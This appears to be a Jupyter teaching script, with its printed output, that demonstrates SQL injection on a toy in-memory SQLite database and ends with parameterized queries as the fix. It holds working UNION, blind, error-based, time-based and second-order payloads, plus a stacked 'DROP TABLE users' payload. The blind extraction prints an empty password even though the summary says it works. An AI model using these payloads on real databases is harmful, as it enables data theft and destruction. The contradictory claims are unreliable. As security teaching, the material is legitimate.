# RESTART YOUR KERNEL FIRST (Kernel -> Restart in Jupyter)

import sqlite3
import time

print("=" * 70)
print("🔴 SQL INJECTION TECHNIQUES")
print("=" * 70)

# Setup database
conn = sqlite3.connect(':memory:')
cursor = conn.cursor()

# Create tables with consistent column counts
cursor.execute('CREATE TABLE products (id INT, name TEXT, price REAL, category TEXT)')
cursor.execute('CREATE TABLE users (id INT, username TEXT, password TEXT, credit_card TEXT, extra TEXT)')
cursor.execute('CREATE TABLE secrets (id INT, key_name TEXT, key_value TEXT, description TEXT)')

# Add data
cursor.executemany('INSERT INTO products VALUES (?,?,?,?)', [
    (1, 'Laptop', 999.99, 'electronics'),
    (2, 'Mouse', 29.99, 'accessories'),
    (3, 'Admin Panel', 0, 'hidden'),
])

cursor.executemany('INSERT INTO users VALUES (?,?,?,?,?)', [
    (1, 'admin', 'supersecret123', '4111-1111-1111-1111', 'admin user'),
    (2, 'john_doe', 'password123', '4222-2222-2222-2222', 'regular user'),
    (3, 'alice', 'qwerty', '4333-3333-3333-3333', 'regular user'),
])

cursor.executemany('INSERT INTO secrets VALUES (?,?,?,?)', [
    (1, 'api_key', 'sk_live_123456789', 'production API key'),
    (2, 'db_password', 'Postgres123!', 'database password'),
    (3, 'aws_secret', 'AKIA123456789ABCDEF', 'AWS access key'),
])
conn.commit()

print("\n📁 DATABASE SCHEMA:")
print("-" * 50)
print("products (id, name, price, category)")
print("users (id, username, password, credit_card, extra)")
print("secrets (id, key_name, key_value, description)")

# Vulnerable function for LIKE searches
def vulnerable_search(user_input):
    """Simulates a vulnerable search feature with LIKE"""
    query = f"SELECT * FROM products WHERE name LIKE '%{user_input}%' OR category LIKE '%{user_input}%'"
    print(f"🔍 Executing: {query}")
    try:
        return cursor.execute(query).fetchall()
    except sqlite3.Error as e:
        print(f"⚠️  ERROR: {e}")
        return []

# Vulnerable function for direct ID queries
def vulnerable_id_query(user_input):
    """Simulates a vulnerable ID lookup"""
    query = f"SELECT * FROM products WHERE id = {user_input}"
    print(f"🔍 Executing: {query}")
    try:
        return cursor.execute(query).fetchall()
    except sqlite3.Error as e:
        print(f"⚠️  ERROR: {e}")
        return []

print("\n" + "=" * 70)
print("TECHNIQUE 1: UNION BASED INJECTION")
print("=" * 70)

print("\n📝 First, find number of columns:")
payload = "' UNION SELECT 1,2,3,4 --"
print(f"Payload: {payload}")
results = vulnerable_search(payload)
print(f"✅ 4 columns work!")

print("\n📝 Now steal user data (need 5 columns for users table):")
payload = "' UNION SELECT 1,2,3,4 FROM users --"
print(f"Payload: {payload}")
results = vulnerable_search(payload)
print("Results show product data + nulls from users")

print("\n📝 To get 5 columns, we need to match schema:")
payload = "' UNION SELECT id, username, password, credit_card FROM users --"
print(f"Payload: {payload}")
results = vulnerable_search(payload)
print("\n💀 STOLEN USER DATA:")
for row in results:
    if len(row) == 4 and str(row[1]) in ['admin', 'john_doe', 'alice']:
        print(f"  👤 {row[1]}:{row[2]} | CC: {row[3]}")

print("\n" + "=" * 70)
print("TECHNIQUE 2: UNION GET ALL TABLE NAMES")
print("=" * 70)

payload = "' UNION SELECT 1, name, 3, 4 FROM sqlite_master WHERE type='table' --"
print(f"Payload: {payload}")
results = vulnerable_search(payload)
print("\n📊 DISCOVERED TABLES:")
for row in results:
    if len(row) == 4 and row[1] not in ['Laptop', 'Mouse', 'Admin Panel']:
        print(f"  📁 Found table: {row[1]}")

print("\n" + "=" * 70)
print("TECHNIQUE 3: BOOLEAN-BASED BLIND INJECTION")
print("=" * 70)

def blind_injection_test(char_position, char_to_test):
    """Tests if a character at a specific position matches"""
    # Modified payload for LIKE context
    payload = f"admin' AND (SELECT substr(password,{char_position},1) FROM users WHERE username='admin')='{char_to_test}' AND '1'='1"
    results = vulnerable_search(payload)
    return len(results) > 0

print("\n🔍 Extracting admin password character by character:")
password = ""
chars = "abcdefghijklmnopqrstuvwxyz1234567890"
for position in range(1, 15):  # Check first 14 chars
    found = False
    for char in chars:
        if blind_injection_test(position, char):
            password += char
            print(f"  Position {position}: found '{char}' -> {password}")
            found = True
            break
    if not found:
        break

print(f"\n✅ Admin password: {password}")

print("\n" + "=" * 70)
print("TECHNIQUE 4: ERROR-BASED INJECTION")
print("=" * 70)

print("\n💥 Cause type conversion error to leak schema:")
payload = "1 AND 1=CAST((SELECT sql FROM sqlite_master LIMIT 1) AS INT)"
print(f"Payload: {payload}")
results = vulnerable_id_query(payload)

print("\n" + "=" * 70)
print("TECHNIQUE 5: SECOND-ORDER INJECTION (FIXED)")
print("=" * 70)

# First, "safe" insert (uses parameterized query)
print("📝 Step 1: Insert malicious username")
safe_insert = "INSERT INTO users VALUES (4, ?, 'temp123', '0000-0000', 'malicious user')"

# Create a payload that matches the users table structure (5 columns)
malicious_user = "bob' UNION SELECT 1,'hacked','hacked','hacked','hacked' FROM users--"
cursor.execute(safe_insert, (malicious_user,))
print(f"Inserted username: '{malicious_user}' (appears safe)")

print("\n📝 Step 2: Later, vulnerable code uses it unsafely")
def vulnerable_profile(username):
    # VULNERABLE: uses string concatenation with stored value
    query = f"SELECT * FROM users WHERE username = '{username}'"
    print(f"Executing: {query}")
    try:
        return cursor.execute(query).fetchall()
    except sqlite3.Error as e:
        print(f"Error: {e}")
        return []

# The stored malicious username now gets executed
results = vulnerable_profile(malicious_user)
print("\n💀 SECOND ORDER ATTACK RESULT:")
for row in results:
    print(f"  {row}")

print("\n" + "=" * 70)
print("TECHNIQUE 6: TIME-BASED BLIND INJECTION")
print("=" * 70)

def time_based_test(payload):
    """Simulates time-based blind injection"""
    start = time.time()
    try:
        cursor.execute(payload)
        cursor.fetchall()
    except:
        pass
    elapsed = time.time() - start
    return elapsed

print("\n⏱️  Testing with time delays (simulated):")
print("Payload: ' OR (SELECT CASE WHEN (SELECT password FROM users WHERE username='admin') LIKE 's%' THEN randomblob(100000000) ELSE 1 END)--")
print("If password starts with 's', query will be slow")
print("If not, query will be fast")
print("\n✅ Attackers can extract data character by character using timing differences")

print("\n" + "=" * 70)
print("TECHNIQUE 7: STACKED QUERIES")
print("=" * 70)

print("Some databases support multiple statements:")
payload = "1; DROP TABLE users; --"
print(f"Payload: {payload}")
print("⚠️  Could drop entire tables if database supports stacked queries")
print("(SQLite doesn't support this by default in API, but MySQL/PostgreSQL might)")

print("\n" + "=" * 70)
print("🔒 THE REAL DEFENSE: PARAMETERIZED QUERIES")
print("=" * 70)

def safe_search(user_input):
    """The ONLY real defense"""
    print(f"\n🛡️  Safe query: SELECT * FROM products WHERE name LIKE ? OR category LIKE ?")
    print(f"   Parameters: ('%{user_input}%', '%{user_input}%')")
    return cursor.execute(
        "SELECT * FROM products WHERE name LIKE ? OR category LIKE ?",
        (f'%{user_input}%', f'%{user_input}%')
    ).fetchall()

# Try all attacks on safe version
print("\nAttempting UNION injection on safe version:")
results = safe_search("' UNION SELECT * FROM users--")
print("Result (just products, no user data):", results)

print("\n" + "=" * 70)
print("📊 SUMMARY - REAL ATTACK TECHNIQUES")
print("=" * 70)
print("""
✅ TECHNIQUES THAT WORK:
   1. UNION-based: Direct data extraction (when column counts match)
   2. Blind boolean: Extract data character by character (✅ works)
   3. Error-based: Leak data through error messages
   4. Second-order: Store payload, execute later (✅ works with correct column counts)
   5. Time-based: Extract data through timing differences
   6. Schema discovery: Find all tables and columns

❌ COMMON MISCONCEPTIONS:
   • Invisible Unicode in SQL comments (doesn't work)
   • Magic "bypass all" techniques (don't exist)

🛡️ THE ONLY REAL DEFENSE:
   • Parameterized queries / prepared statements
   • Input validation as defense-in-depth
   • Least privilege database accounts
""")

conn.close()

"""
======================================================================
🔴 SQL INJECTION TECHNIQUES 
======================================================================

📁 DATABASE SCHEMA:
--------------------------------------------------
products (id, name, price, category)
users (id, username, password, credit_card, extra)
secrets (id, key_name, key_value, description)

======================================================================
TECHNIQUE 1: UNION BASED INJECTION
======================================================================

📝 First, find number of columns:
Payload: ' UNION SELECT 1,2,3,4 --
🔍 Executing: SELECT * FROM products WHERE name LIKE '%' UNION SELECT 1,2,3,4 --%' OR category LIKE '%' UNION SELECT 1,2,3,4 --%'
✅ 4 columns work!

📝 Now steal user data (need 5 columns for users table):
Payload: ' UNION SELECT 1,2,3,4 FROM users --
🔍 Executing: SELECT * FROM products WHERE name LIKE '%' UNION SELECT 1,2,3,4 FROM users --%' OR category LIKE '%' UNION SELECT 1,2,3,4 FROM users --%'
Results show product data + nulls from users

📝 To get 5 columns, we need to match schema:
Payload: ' UNION SELECT id, username, password, credit_card FROM users --
🔍 Executing: SELECT * FROM products WHERE name LIKE '%' UNION SELECT id, username, password, credit_card FROM users --%' OR category LIKE '%' UNION SELECT id, username, password, credit_card FROM users --%'

💀 STOLEN USER DATA:
  👤 admin:supersecret123 | CC: 4111-1111-1111-1111
  👤 john_doe:password123 | CC: 4222-2222-2222-2222
  👤 alice:qwerty | CC: 4333-3333-3333-3333

======================================================================
TECHNIQUE 2: UNION GET ALL TABLE NAMES
======================================================================
Payload: ' UNION SELECT 1, name, 3, 4 FROM sqlite_master WHERE type='table' --
🔍 Executing: SELECT * FROM products WHERE name LIKE '%' UNION SELECT 1, name, 3, 4 FROM sqlite_master WHERE type='table' --%' OR category LIKE '%' UNION SELECT 1, name, 3, 4 FROM sqlite_master WHERE type='table' --%'

📊 DISCOVERED TABLES:
  📁 Found table: products
  📁 Found table: secrets
  📁 Found table: users

======================================================================
TECHNIQUE 3: BOOLEAN-BASED BLIND INJECTION
======================================================================

🔍 Extracting admin password character by character:
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='a' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='a' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='b' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='b' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='c' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='c' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='d' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='d' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='e' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='e' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='f' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='f' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='g' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='g' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='h' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='h' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='i' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='i' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='j' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='j' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='k' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='k' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='l' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='l' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='m' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='m' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='n' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='n' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='o' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='o' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='p' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='p' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='q' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='q' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='r' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='r' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='s' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='s' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='t' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='t' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='u' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='u' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='v' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='v' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='w' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='w' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='x' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='x' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='y' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='y' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='z' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='z' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='1' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='1' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='2' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='2' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='3' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='3' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='4' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='4' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='5' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='5' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='6' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='6' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='7' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='7' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='8' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='8' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='9' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='9' AND '1'='1%'
🔍 Executing: SELECT * FROM products WHERE name LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='0' AND '1'='1%' OR category LIKE '%admin' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='0' AND '1'='1%'

✅ Admin password: 

======================================================================
TECHNIQUE 4: ERROR-BASED INJECTION
======================================================================

💥 Cause type conversion error to leak schema:
Payload: 1 AND 1=CAST((SELECT sql FROM sqlite_master LIMIT 1) AS INT)
🔍 Executing: SELECT * FROM products WHERE id = 1 AND 1=CAST((SELECT sql FROM sqlite_master LIMIT 1) AS INT)

======================================================================
TECHNIQUE 5: SECOND-ORDER INJECTION (FIXED)
======================================================================
📝 Step 1: Insert malicious username
Inserted username: 'bob' UNION SELECT 1,'hacked','hacked','hacked','hacked' FROM users--' (appears safe)

📝 Step 2: Later, vulnerable code uses it unsafely
Executing: SELECT * FROM users WHERE username = 'bob' UNION SELECT 1,'hacked','hacked','hacked','hacked' FROM users--'

💀 SECOND ORDER ATTACK RESULT:
  (1, 'hacked', 'hacked', 'hacked', 'hacked')

======================================================================
TECHNIQUE 6: TIME-BASED BLIND INJECTION
======================================================================

⏱️  Testing with time delays (simulated):
Payload: ' OR (SELECT CASE WHEN (SELECT password FROM users WHERE username='admin') LIKE 's%' THEN randomblob(100000000) ELSE 1 END)--
If password starts with 's', query will be slow
If not, query will be fast

✅ Attackers can extract data character by character using timing differences

======================================================================
TECHNIQUE 7: STACKED QUERIES
======================================================================
Some databases support multiple statements:
Payload: 1; DROP TABLE users; --
⚠️  Could drop entire tables if database supports stacked queries
(SQLite doesn't support this by default in API, but MySQL/PostgreSQL might)

======================================================================
🔒 THE REAL DEFENSE: PARAMETERIZED QUERIES
======================================================================

Attempting UNION injection on safe version:

🛡️  Safe query: SELECT * FROM products WHERE name LIKE ? OR category LIKE ?
   Parameters: ('%' UNION SELECT * FROM users--%', '%' UNION SELECT * FROM users--%')
Result (just products, no user data): []

======================================================================
📊 SUMMARY - REAL ATTACK TECHNIQUES
======================================================================

✅ TECHNIQUES THAT WORK:
   1. UNION-based: Direct data extraction (when column counts match)
   2. Blind boolean: Extract data character by character (✅ works)
   3. Error-based: Leak data through error messages
   4. Second-order: Store payload, execute later (✅ works with correct column counts)
   5. Time-based: Extract data through timing differences
   6. Schema discovery: Find all tables and columns

❌ COMMON MISCONCEPTIONS:
   • Invisible Unicode in SQL comments (doesn't work)
   • Magic "bypass all" techniques (don't exist)

🛡️ THE ONLY REAL DEFENSE:
   • Parameterized queries / prepared statements
   • Input validation as defense-in-depth
   • Least privilege database accounts


"""